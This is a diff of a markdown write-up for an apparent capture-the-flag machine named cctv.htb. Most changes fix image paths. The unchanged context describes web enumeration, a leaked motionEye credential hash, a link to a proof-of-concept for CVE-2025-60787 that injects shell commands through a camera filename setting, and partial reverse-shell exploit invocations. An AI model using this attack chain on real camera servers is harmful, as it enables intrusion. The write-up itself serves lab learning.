@@ -58,7 +58,7 @@ Once accessing the website, the homepage advertised CCTV services. Nothing explo
 ## Website Screenshot
 
 
-![Website Interface](images/WEBDETAIL.png)
+![Website Interface](assets/WEBDETAIL.png)
 
 
 After clicking the login page, the underlying technology appeared: **ZoneMinder**.
@@ -74,7 +74,7 @@ gobuster dir -u http://cctv.htb -w /usr/share/wordlists/dirb/common.txt
 ## Gobuster Screenshot
 
 
-![Discovery](assets/RECON.png)
+![Discovery](assets/WEBENUMERATION.png)
 
 
 No obvious clues. No exposed changelog. No version leaks.
@@ -100,7 +100,7 @@ ZoneMinder v1.37.63
 ## Dashboard Screenshot
 
 
-![Nmap Scan](images/WEBDASHBOARD.png)
+![Dashboard](assets/WEBDASHBOARD.png)
 
 
 ---
@@ -233,9 +233,8 @@ Further inspection revealed the service had strong privileges and referenced con
 
 ## motionEye Enumeration Screenshot
 
-```text
-![Nmap Scan](images/nmap.png)
-```
+
+![Enumeration](assets/POSTEXPLOITENUMERATION.png)
 
 Inside the configuration files, motionEye credentials were discovered.
 
@@ -261,9 +260,9 @@ admin:989c5a8ee87a0e9521ec81a79187d162109282f0
 
 ## motionEye Dashboard Screenshot
 
-```text
-![Nmap Scan](images/nmap.png)
-```
+
+![motionEye](assets/WEBCCTV.png)
+
 
 After identifying the version:
 
@@ -285,7 +284,7 @@ Like slipping dynamite into a package labeled “camera filename.”
 
 The following PoC was used:
 
-url CVE-2025-60787 PoC Repository: https://github.com/d3vn0mi/CVE-2025-60787-POC
+url CVE-2025-60787 PoC Repository: https://github.com/d3vn0mi/CVE-2025-60787-POC
 
 The exploit authenticates into motionEye, enumerates configured cameras, then injects malicious shell commands into the `image_file_name` setting. When motionEye processes the configuration, the payload gets executed by the underlying Motion service.
 
@@ -310,9 +309,9 @@ python3 exploit.py revshell \
 
 ## Reverse Shell Screenshot
 
-```text
-![Nmap Scan](images/nmap.png)
-```
+
+![Initial](assets/INITIALACCESS.png)
+
 
 Seconds later, the listener caught a shell.
 
@@ -389,17 +388,17 @@ python3 exploit.py revshell \
 
 # User Flag
 
-```text
-![Nmap Scan](images/nmap.png)
-```
+
+![Userflag](assets/USERFLAG.png)
+
 
 ---
 
 # Root Flag
 
-```text
-![Nmap Scan](images/nmap.png)
-```
+
+![Rootflag](assets/ROOTFLAG.png)
+
 
 ---
 
